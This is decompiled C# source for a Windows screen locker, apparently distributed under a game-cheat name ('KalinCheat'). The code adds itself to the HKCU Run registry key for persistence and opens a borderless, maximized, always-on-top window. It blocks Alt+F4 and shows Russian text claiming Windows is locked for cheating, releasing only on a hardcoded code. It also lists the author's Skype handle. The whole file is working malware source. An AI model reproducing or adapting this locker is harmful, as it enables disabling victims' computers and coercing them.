using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.Win32;

namespace KalinCheat;

public class Form1 : Form
{
	private IContainer components = null;

	private Label label1;

	private Button button1;

	private GroupBox groupBox1;

	private GroupBox groupBox2;

	private Button button2;

	private Button button14;

	private Button button12;

	private Button button11;

	private Button button10;

	private Button button9;

	private Button button8;

	private Button button7;

	private Button button6;

	private Button button5;

	private Button button4;

	private Button button3;

	private TextBox textBox1;

	private Button button13;

	private GroupBox groupBox3;

	private Label label2;

	private Label label3;

	private GroupBox groupBox4;

	private RichTextBox richTextBox1;

	private RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_016e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0178: Expected O, but got Unknown
		//IL_021e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0228: Expected O, but got Unknown
		//IL_03dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e7: Expected O, but got Unknown
		//IL_048a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0494: Expected O, but got Unknown
		//IL_0552: Unknown result type (might be due to invalid IL or missing references)
		//IL_055c: Expected O, but got Unknown
		//IL_0617: Unknown result type (might be due to invalid IL or missing references)
		//IL_0621: Expected O, but got Unknown
		//IL_06dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e6: Expected O, but got Unknown
		//IL_07a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ab: Expected O, but got Unknown
		//IL_0866: Unknown result type (might be due to invalid IL or missing references)
		//IL_0870: Expected O, but got Unknown
		//IL_092b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0935: Expected O, but got Unknown
		//IL_09ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f9: Expected O, but got Unknown
		//IL_0ab0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aba: Expected O, but got Unknown
		//IL_0b71: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b7b: Expected O, but got Unknown
		//IL_0c32: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c3c: Expected O, but got Unknown
		//IL_0d7f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d89: Expected O, but got Unknown
		//IL_0e2f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e39: Expected O, but got Unknown
		//IL_0ef2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0efc: Expected O, but got Unknown
		//IL_0fea: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ff4: Expected O, but got Unknown
		//IL_10a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_10b1: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		button1 = new Button();
		groupBox1 = new GroupBox();
		button14 = new Button();
		button12 = new Button();
		button11 = new Button();
		button10 = new Button();
		button9 = new Button();
		button8 = new Button();
		button7 = new Button();
		button6 = new Button();
		button5 = new Button();
		button4 = new Button();
		button3 = new Button();
		textBox1 = new TextBox();
		groupBox2 = new GroupBox();
		button13 = new Button();
		button2 = new Button();
		groupBox3 = new GroupBox();
		groupBox4 = new GroupBox();
		richTextBox1 = new RichTextBox();
		label3 = new Label();
		label2 = new Label();
		((Control)groupBox1).SuspendLayout();
		((Control)groupBox2).SuspendLayout();
		((Control)groupBox3).SuspendLayout();
		((Control)groupBox4).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)label1).set_Anchor((AnchorStyles)1);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 26.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label1).set_ForeColor(Color.Green);
		((Control)label1).set_Location(new Point(199, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(416, 39));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Windows заблокирован");
		label1.set_TextAlign((ContentAlignment)2);
		((Control)button1).set_Anchor((AnchorStyles)9);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button1).set_ForeColor(Color.Green);
		((Control)button1).set_Location(new Point(782, -2));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(27, 25));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("Х");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)groupBox1).set_Anchor((AnchorStyles)1);
		((Control)groupBox1).get_Controls().Add((Control)(object)button14);
		((Control)groupBox1).get_Controls().Add((Control)(object)button12);
		((Control)groupBox1).get_Controls().Add((Control)(object)button11);
		((Control)groupBox1).get_Controls().Add((Control)(object)button10);
		((Control)groupBox1).get_Controls().Add((Control)(object)button9);
		((Control)groupBox1).get_Controls().Add((Control)(object)button8);
		((Control)groupBox1).get_Controls().Add((Control)(object)button7);
		((Control)groupBox1).get_Controls().Add((Control)(object)button6);
		((Control)groupBox1).get_Controls().Add((Control)(object)button5);
		((Control)groupBox1).get_Controls().Add((Control)(object)button4);
		((Control)groupBox1).get_Controls().Add((Control)(object)button3);
		((Control)groupBox1).get_Controls().Add((Control)(object)textBox1);
		((Control)groupBox1).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)groupBox1).set_ForeColor(Color.Green);
		((Control)groupBox1).set_Location(new Point(12, 51));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(603, 97));
		((Control)groupBox1).set_TabIndex(2);
		groupBox1.set_TabStop(false);
		((Control)groupBox1).set_Text("Пароль");
		((Control)button14).set_Anchor((AnchorStyles)9);
		((ButtonBase)button14).set_FlatStyle((FlatStyle)0);
		((Control)button14).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button14).set_ForeColor(Color.Green);
		((Control)button14).set_Location(new Point(336, 47));
		((Control)button14).set_Name("button14");
		((Control)button14).set_Size(new Size(261, 44));
		((Control)button14).set_TabIndex(14);
		((Control)button14).set_Text("Очистить");
		((ButtonBase)button14).set_UseVisualStyleBackColor(true);
		((Control)button14).add_Click((EventHandler)button14_Click);
		((Control)button12).set_Anchor((AnchorStyles)9);
		((ButtonBase)button12).set_FlatStyle((FlatStyle)0);
		((Control)button12).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button12).set_ForeColor(Color.Green);
		((Control)button12).set_Location(new Point(303, 47));
		((Control)button12).set_Name("button12");
		((Control)button12).set_Size(new Size(27, 44));
		((Control)button12).set_TabIndex(12);
		((Control)button12).set_Text("0");
		((ButtonBase)button12).set_UseVisualStyleBackColor(true);
		((Control)button12).add_Click((EventHandler)button12_Click);
		((Control)button11).set_Anchor((AnchorStyles)9);
		((ButtonBase)button11).set_FlatStyle((FlatStyle)0);
		((Control)button11).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button11).set_ForeColor(Color.Green);
		((Control)button11).set_Location(new Point(270, 47));
		((Control)button11).set_Name("button11");
		((Control)button11).set_Size(new Size(27, 44));
		((Control)button11).set_TabIndex(11);
		((Control)button11).set_Text("9");
		((ButtonBase)button11).set_UseVisualStyleBackColor(true);
		((Control)button11).add_Click((EventHandler)button11_Click);
		((Control)button10).set_Anchor((AnchorStyles)9);
		((ButtonBase)button10).set_FlatStyle((FlatStyle)0);
		((Control)button10).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button10).set_ForeColor(Color.Green);
		((Control)button10).set_Location(new Point(237, 47));
		((Control)button10).set_Name("button10");
		((Control)button10).set_Size(new Size(27, 44));
		((Control)button10).set_TabIndex(10);
		((Control)button10).set_Text("8");
		((ButtonBase)button10).set_UseVisualStyleBackColor(true);
		((Control)button10).add_Click((EventHandler)button10_Click);
		((Control)button9).set_Anchor((AnchorStyles)9);
		((ButtonBase)button9).set_FlatStyle((FlatStyle)0);
		((Control)button9).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button9).set_ForeColor(Color.Green);
		((Control)button9).set_Location(new Point(171, 47));
		((Control)button9).set_Name("button9");
		((Control)button9).set_Size(new Size(27, 44));
		((Control)button9).set_TabIndex(9);
		((Control)button9).set_Text("6");
		((ButtonBase)button9).set_UseVisualStyleBackColor(true);
		((Control)button9).add_Click((EventHandler)button9_Click);
		((Control)button8).set_Anchor((AnchorStyles)9);
		((ButtonBase)button8).set_FlatStyle((FlatStyle)0);
		((Control)button8).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button8).set_ForeColor(Color.Green);
		((Control)button8).set_Location(new Point(204, 47));
		((Control)button8).set_Name("button8");
		((Control)button8).set_Size(new Size(27, 44));
		((Control)button8).set_TabIndex(9);
		((Control)button8).set_Text("7");
		((ButtonBase)button8).set_UseVisualStyleBackColor(true);
		((Control)button8).add_Click((EventHandler)button8_Click);
		((Control)button7).set_Anchor((AnchorStyles)9);
		((ButtonBase)button7).set_FlatStyle((FlatStyle)0);
		((Control)button7).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button7).set_ForeColor(Color.Green);
		((Control)button7).set_Location(new Point(138, 47));
		((Control)button7).set_Name("button7");
		((Control)button7).set_Size(new Size(27, 44));
		((Control)button7).set_TabIndex(8);
		((Control)button7).set_Text("5");
		((ButtonBase)button7).set_UseVisualStyleBackColor(true);
		((Control)button7).add_Click((EventHandler)button7_Click);
		((Control)button6).set_Anchor((AnchorStyles)9);
		((ButtonBase)button6).set_FlatStyle((FlatStyle)0);
		((Control)button6).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button6).set_ForeColor(Color.Green);
		((Control)button6).set_Location(new Point(105, 47));
		((Control)button6).set_Name("button6");
		((Control)button6).set_Size(new Size(27, 44));
		((Control)button6).set_TabIndex(7);
		((Control)button6).set_Text("4");
		((ButtonBase)button6).set_UseVisualStyleBackColor(true);
		((Control)button6).add_Click((EventHandler)button6_Click);
		((Control)button5).set_Anchor((AnchorStyles)9);
		((ButtonBase)button5).set_FlatStyle((FlatStyle)0);
		((Control)button5).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button5).set_ForeColor(Color.Green);
		((Control)button5).set_Location(new Point(72, 47));
		((Control)button5).set_Name("button5");
		((Control)button5).set_Size(new Size(27, 44));
		((Control)button5).set_TabIndex(6);
		((Control)button5).set_Text("3");
		((ButtonBase)button5).set_UseVisualStyleBackColor(true);
		((Control)button5).add_Click((EventHandler)button5_Click);
		((Control)button4).set_Anchor((AnchorStyles)9);
		((ButtonBase)button4).set_FlatStyle((FlatStyle)0);
		((Control)button4).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button4).set_ForeColor(Color.Green);
		((Control)button4).set_Location(new Point(39, 47));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(27, 44));
		((Control)button4).set_TabIndex(5);
		((Control)button4).set_Text("2");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button4).add_Click((EventHandler)button4_Click);
		((Control)button3).set_Anchor((AnchorStyles)9);
		((ButtonBase)button3).set_FlatStyle((FlatStyle)0);
		((Control)button3).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button3).set_ForeColor(Color.Green);
		((Control)button3).set_Location(new Point(6, 47));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(27, 44));
		((Control)button3).set_TabIndex(4);
		((Control)button3).set_Text("1");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)textBox1).set_Enabled(false);
		((Control)textBox1).set_ForeColor(Color.Green);
		((Control)textBox1).set_Location(new Point(6, 20));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(591, 21));
		((Control)textBox1).set_TabIndex(0);
		textBox1.set_TextAlign((HorizontalAlignment)2);
		((Control)groupBox2).set_Anchor((AnchorStyles)1);
		((Control)groupBox2).get_Controls().Add((Control)(object)button13);
		((Control)groupBox2).get_Controls().Add((Control)(object)button2);
		((Control)groupBox2).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)groupBox2).set_ForeColor(Color.Green);
		((Control)groupBox2).set_Location(new Point(621, 51));
		((Control)groupBox2).set_Name("groupBox2");
		((Control)groupBox2).set_Size(new Size(173, 97));
		((Control)groupBox2).set_TabIndex(3);
		groupBox2.set_TabStop(false);
		((Control)groupBox2).set_Text("Действия");
		((Control)button13).set_Anchor((AnchorStyles)9);
		((ButtonBase)button13).set_FlatStyle((FlatStyle)0);
		((Control)button13).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button13).set_ForeColor(Color.Green);
		((Control)button13).set_Location(new Point(6, 58));
		((Control)button13).set_Name("button13");
		((Control)button13).set_Size(new Size(161, 33));
		((Control)button13).set_TabIndex(5);
		((Control)button13).set_Text("За что заблокирован");
		((ButtonBase)button13).set_UseVisualStyleBackColor(true);
		((Control)button13).add_Click((EventHandler)button13_Click);
		((Control)button2).set_Anchor((AnchorStyles)9);
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button2).set_ForeColor(Color.Green);
		((Control)button2).set_Location(new Point(6, 20));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(161, 33));
		((Control)button2).set_TabIndex(4);
		((Control)button2).set_Text("Разблокировать");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)groupBox3).set_Anchor((AnchorStyles)1);
		((Control)groupBox3).get_Controls().Add((Control)(object)groupBox4);
		((Control)groupBox3).get_Controls().Add((Control)(object)label3);
		((Control)groupBox3).get_Controls().Add((Control)(object)label2);
		((Control)groupBox3).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)groupBox3).set_ForeColor(Color.Green);
		((Control)groupBox3).set_Location(new Point(12, 150));
		((Control)groupBox3).set_Name("groupBox3");
		((Control)groupBox3).set_Size(new Size(782, 333));
		((Control)groupBox3).set_TabIndex(15);
		groupBox3.set_TabStop(false);
		((Control)groupBox3).set_Text("Информация");
		((Control)groupBox4).set_Anchor((AnchorStyles)1);
		((Control)groupBox4).get_Controls().Add((Control)(object)richTextBox1);
		((Control)groupBox4).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)groupBox4).set_ForeColor(Color.Green);
		((Control)groupBox4).set_Location(new Point(9, 122));
		((Control)groupBox4).set_Name("groupBox4");
		((Control)groupBox4).set_Size(new Size(537, 197));
		((Control)groupBox4).set_TabIndex(6);
		groupBox4.set_TabStop(false);
		((Control)groupBox4).set_Text("Для тех у кого нет микрофона");
		((Control)richTextBox1).set_BackColor(Color.Black);
		((Control)richTextBox1).set_ForeColor(Color.Green);
		((Control)richTextBox1).set_Location(new Point(6, 20));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(525, 171));
		((Control)richTextBox1).set_TabIndex(0);
		((Control)richTextBox1).set_Text("");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(552, 304));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(224, 15));
		((Control)label3).set_TabIndex(1);
		((Control)label3).set_Text("KillCheat © Все права защищены");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(6, 17));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(540, 90));
		((Control)label2).set_TabIndex(0);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(806, 495));
		((Control)this).get_Controls().Add((Control)(object)groupBox3);
		((Control)this).get_Controls().Add((Control)(object)groupBox2);
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.9);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((Control)groupBox2).ResumeLayout(false);
		((Control)groupBox3).ResumeLayout(false);
		((Control)groupBox3).PerformLayout();
		((Control)groupBox4).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public Form1()
	{
		reg.SetValue("My app", Application.get_ExecutablePath().ToString());
		InitializeComponent();
	}

	protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Invalid comparison between Unknown and I4
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		if ((int)keyData == 262259)
		{
			return true;
		}
		return ((Form)this).ProcessCmdKey(ref msg, keyData);
	}

	private void button4_Click(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "2");
	}

	private void button5_Click(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "3");
	}

	private void button6_Click(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "4");
	}

	private void button7_Click(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "5");
	}

	private void button9_Click(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "6");
	}

	private void button8_Click(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "7");
	}

	private void button10_Click(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "8");
	}

	private void button11_Click(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "9");
	}

	private void button12_Click(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "0");
	}

	private void button14_Click(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text("");
	}

	private void button2_Click(object sender, EventArgs e)
	{
		if (((Control)textBox1).get_Text() == "00099985")
		{
			Application.Exit();
		}
		else
		{
			((Control)textBox1).set_Text("Неверный Ключ!");
		}
	}

	private void button3_Click(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "1");
	}

	private void button13_Click(object sender, EventArgs e)
	{
		((Control)label2).set_Text("Ваш Windows заблокирован!\r\n За использование читов и нарушение лицензионных прав игры!\r\n Что бы разблокировать Windows вам надо:\r\n 1) Выпросить пароль.\r\n 2) Можно связатся с создателем по Skype: den1998ty (МОГУ НЕ ДАТЬ ПАРОЛЬ)\r\n 3) Переустановить Windows");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)label2).set_Text("");
		((Form)this).set_TopMost(true);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Form2 form = new Form2();
		((Form)form).Show((IWin32Window)(object)this);
	}
}
